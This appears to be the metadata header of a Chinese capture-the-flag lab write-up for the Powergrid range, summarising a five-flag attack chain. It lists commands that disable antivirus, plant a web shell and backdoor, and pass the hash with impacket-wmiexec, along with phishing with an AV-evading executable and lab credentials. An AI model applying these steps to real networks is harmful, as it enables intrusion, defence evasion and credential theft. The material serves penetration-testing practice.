---
title: WP | 春秋云境靶场 Powergrid
contest: 春秋云境 Powergrid 靶场
year: 2026
difficulty: hard
vuln_type: web_unknown
tags: [swagger_api_doc, weak_password_admin, mail_phishing_exe_av_bypass, openvpn_ovpn_file, lateral_movement, pth_hash_pass_the_hash, safe_dog_kill, wmiexec_pth, mysql_spring_application_yml, larkmt_admin_db]
attack_chain: flag1:nmap 扫端口 22/25/80/110/143/443/465/587/993/995 + dirsearch swagger-resources /v2/api-docs → admin 123456 弱口令登录 → flag2:zs@powergrid.com 123456 邮箱 → 邮件钓鱼 + 免杀 exe → Administrator Admin123 改密 → 桌面 vpn/zhangsan.ovpn → OpenVPN 远程 IP 改成外网入口 IP → 172.27.236.3 vpn IP → flag3:fping 172.16.200.0/24 → 172.16.200.78 DATA 服务器 + 200.81 MySQL + 200.76 Windows + 200.87 OpenVPN → p0wny-shell 传图 → net stop SafeDogGuardCenter + powershell Set-MpPreference 关杀软 → eval 后门 → flag4:wmiexec administrator@172.16.200.78 -hashes pth → reg add DisableRestrictedAdmin + type flag.txt → flag5:application.yml 找 MySQL rjS8K2RW7KE4E1vk 密码 → job_user_datas select → md5(库名+xxx)
key_payload: swagger-resources + /v2/api-docs / net user Administrator Admin123 / nxc smb 172.16.200.78 -u administrator -H da6df19610... / impacket-wmiexec administrator@172.16.200.78 -hashes :da6df196100... -codec gbk / mysql -h 172.16.200.81 -u root -p'rjS8K2RW7KE4E1vk' web
one_liner: 春秋云境 Powergrid 5 flag 全流程：swagger 弱口令 → 邮件钓鱼 + 免杀 → OpenVPN 改远端 IP → PTH 哈希传递 + WMIExec → Spring application.yml MySQL 凭据取数据 md5。
lesson: 当 OpenVPN .ovpn 配置文件中 remote 是内网 IP 时，直接改成外网入口 IP 即可绕过 NAT；Spring Boot 应用的 application.yml 默认存数据库密码是经典配置泄露。
quality: high
---
